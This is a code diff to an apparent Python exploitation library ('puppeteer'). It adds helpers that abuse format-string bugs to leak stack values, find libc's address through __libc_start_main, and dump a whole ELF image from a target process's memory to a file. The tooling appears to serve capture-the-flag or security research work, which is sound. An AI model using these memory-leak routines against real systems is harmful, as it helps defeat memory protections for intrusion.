@@ -1,7 +1,7 @@
 import logging
 l = logging.getLogger("puppeteer.manipulator")
+#l.setLevel(logging.INFO)
 
-import abc
 import struct
 import string # pylint: disable=W0402
 import itertools
@@ -11,6 +11,7 @@ from .errors import NotLeetEnough
 from .formatter import FmtStr
 from .architectures import x86
 from .rop import ROPChain, ROPGadget
+from .utils import unleet
 
 def _safe_unsafe(f):
     '''
@@ -31,11 +32,7 @@ def _safe_unsafe(f):
 
     return wrapper
 
-
-# pylint: disable=no-self-use,unused-argument
-class Manipulator:
-    __metaclass__ = abc.ABCMeta
-
+class Manipulator(object):
     def __init__(self, arch=x86):
         '''
         This should connect to or spawn up the program in question.
@@ -63,8 +60,6 @@ class Manipulator:
             return s
 
         return "".join([ s[i:i+self.arch.bytes][::-1] for i in range(0, len(s), self.arch.bytes) ])
-
-
 
     def pack(self, n):
         if type(n) in (int, long):
@@ -184,12 +179,20 @@ class Manipulator:
                 if isinstance(fmt, FmtStr):
                     fmt.set_flags(**f.puppeteer_flags['fmt_flags'])
                     result = f(fmt.build())
-                    if len(result) < fmt.before_absolute_reads:
+                    l.debug("... raw result: %r", result)
+                    if len(result) < fmt.literal_length:
                         return ""
                     else:
-                        result = result[fmt.before_absolute_reads:].rstrip(fmt.pad_char)
+                        result = result[fmt.literal_length:]
+                        l.debug("... after leading trim: %r", result)
+                        result = result[:result.rindex(fmt.pad_char * fmt.padding_amount)]
+                        l.debug("... after trailing trim: %r", result)
                     return result
                 elif isinstance(fmt, str):
+                    if f.puppeteer_flags['fmt_flags']['forbidden'] is not None:
+                        for c in f.puppeteer_flags['fmt_flags']['forbidden']:
+                            if c in fmt:
+                                raise unleet("Forbidden chars in format string (%r)" % c)
                     return f(fmt)
                 else:
                     raise Exception("Unrecognized format string type. Please provide FmtStr or str")
@@ -237,7 +240,7 @@ class Manipulator:
                 content += '\x00'
 
             if failures > max_failures:
-                raise NotLeetEnough("do_printf_read hit more than %d consecutive failures", max_failures)
+                raise unleet("do_printf_read hit more than %d consecutive failures" % max_failures)
 
         return content
 
@@ -306,12 +309,14 @@ class Manipulator:
 
         return self.do_relative_read(0, length, reg=self.arch.sp_name)
 
-    def main_return_address(self, start_offset=1):
+    def main_return_address(self, start_offset=None):
         '''
         Get the return address that main will return to. This is usually
         libc_start_main, in libc, which gets you the address of (and a pointer
         into) libc off of a relative read.
         '''
+
+        start_offset = 1 if start_offset is None else start_offset
 
         # strategy:
         # 1. search for a return address to main
@@ -320,6 +325,7 @@ class Manipulator:
 
         l.debug("Looking for libc!")
 
+        i = 0
         for i in itertools.count(start=start_offset):
             l.debug("... checking offset %d", i)
             v = self.unpack(self.do_relative_read(i*self.arch.bytes, self.arch.bytes))
@@ -327,40 +333,54 @@ class Manipulator:
                 l.debug("... found the return address to main (specifically, to 0x%x) at offset %d!", v, i)
                 break
 
-        i += 3 + self.info['main_stackframe_size'] / self.arch.bytes # pylint: disable=undefined-loop-variable
+        i += 3 + self.info['main_stackframe_size'] / self.arch.bytes
         l.debug("... the return address into __libc_start_main should be at offset %d", i)
 
         v = self.unpack(self.do_relative_read(i*self.arch.bytes, self.arch.bytes))
         return v
 
-    def dump_pageset(self, addr):
+    def dump_elf(self, addr):
         '''
-        Dumps a page at the given address, along with any adjacent page that
-        pointers are found to. The idea is to use this to dump libraries.
+        Dumps an ELF at the given address. The address can index partway into the ELF.
         '''
         addr -= addr % self.arch.page_size
 
         pages = { }
         queue = [ addr ]
-        l.info("Dumping pages around 0x%x", addr)
+        l.info("Dumping the ELF that includes 0x%x", addr)
 
         while len(queue) != 0:
             a = queue.pop()
             l.info("... dumping page 0x%x", a)
             pages[a] = self.do_memory_read(a, self.arch.page_size)
 
+            # assume that ELFs are continuous in memory, and start with '\x7fELF'
+            # however, since the first byte often can't be read by a format string
+            # (because \x00 is in the address), we need to match '\x00ELF' as well
+            if pages[a].startswith('\x7fELF') or pages[a].startswith('\x00ELF'):
+                break
+
+            queue.append(a - self.arch.page_size)
+            #if pages[a][-4:] != '\x00\x00\x00\x00':
+            #   queue.append(a + self.arch.page_size)
+
             # TODO: the following only works on, at best, static binaries
             # that we just don't have locally. It won't work for things
             # that use relative jumps (almost everything). For that,
             # we should really disassemble the dumped page...
-            if self.pack(a - self.arch.page_size) in pages[a]:
-                l.info("... 0x%x found!", a - self.arch.page_size)
-                queue.append(a - self.arch.page_size)
-            if self.pack(a + self.arch.page_size) in pages[a]:
-                l.info("... 0x%x found!", a + self.arch.page_size)
-                queue.append(a + self.arch.page_size)
+            #if self.pack(a - self.arch.page_size) in pages[a]:
+            #   l.info("... 0x%x found!", a - self.arch.page_size)
+            #   queue.append(a - self.arch.page_size)
+            #if self.pack(a + self.arch.page_size) in pages[a]:
+            #   l.info("... 0x%x found!", a + self.arch.page_size)
+            #   queue.append(a + self.arch.page_size)
 
         return pages
+
+    def dump_libc(self, filename, start_offset=None):
+        libc_addr = self.main_return_address(start_offset=start_offset)
+        libc_contents = self.dump_elf(libc_addr)
+        open(filename, "w").write("".join([ libc_contents[k] for k in sorted(libc_contents.keys()) ]))
 
     #
     # Crazy UI
